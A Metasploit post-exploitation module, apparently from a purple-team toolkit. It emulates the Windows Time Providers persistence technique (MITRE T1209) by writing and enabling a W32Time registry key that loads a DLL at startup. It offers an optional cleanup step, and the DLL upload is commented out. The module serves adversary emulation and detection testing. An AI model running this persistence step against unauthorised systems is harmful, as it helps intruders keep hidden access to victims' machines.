##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
    include Msf::Post::Windows::Priv
    include Msf::Exploit::FileDropper
    include Msf::Post::File

    def initialize(info={})
      super(update_info(info,
                        'Name'          => 'Time Providers (T1209) Windows - Purple Team',
                        'Description'   => %q{
                          Persistence, Lateral Movement:
                          The Windows Time service (W32Time) enables time synchronization across and within domains. [1] W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.
                          Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.
                          Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.},
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Praetorian' ],
                        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1209' ] ],
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
                       ))
      register_options(
      [
        # OptString.new("PATH", [true, "Path to save the persistance time provider dll", "C:\\t1209.dll"]),
        OptBool.new("CLEANUP", [true, "Remove the registry key immediately after adding it.", false])
      ])
    end

    def run
    #
    # TODO upload a working dll for persistence
    #
      begin
        raise "Module requires meterpreter session." unless session.type == "meterpreter"
        raise "Requires admin priviledges." unless is_admin?

        # kill calc if it's running
        #client.run_cmd("pkill -Sf [Cc]alc")

        # upload the time provider dll
        #local_file_path = ::Msf::Config.data_directory + '/purple/t1209/t1209_' + (client.arch == ARCH_X86 ? 'x86.dll' : 'x64.dll')
        #remote_file_path = datastore['PATH']
        #print_status("Uploading #{local_file_path} to #{remote_file_path}")
        #upload_file(remote_file_path, local_file_path)

        # register the time provider
        reg_base_key = "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\t1209"
        print_status("Creating time provider at " + reg_base_key)
        registry_createkey(reg_base_key)
        if registry_setvaldata(reg_base_key, "DllName", "C:\\t1209.dll", "REG_SZ") &&
          registry_setvaldata(reg_base_key, "Enabled", 1, "REG_DWORD") &&
          registry_setvaldata(reg_base_key, "InputProvider", 1, "REG_DWORD")
            print_good("Success! Modified the registry and added malicious time provider.")
        else
          raise 'Failure editing the registry.'
        end

        # cleanup if we need to
        if datastore['CLEANUP']
          print_status("Deleting the malicious time provider key...")
          registry_deletekey(reg_base_key)
          #print_status("Killing calc.")
          #client.run_cmd("pkill -Sf [Cc]alc")
          #print_status("Deleting dll and t1209.txt")
          #register_file_for_cleanup(remote_file_path)
          #register_file_for_cleanup("C:\\t1209.txt")
        end

        print_good("Module T1209W execution successful.")

      rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1209W execution failed.")
      end
    end
  end
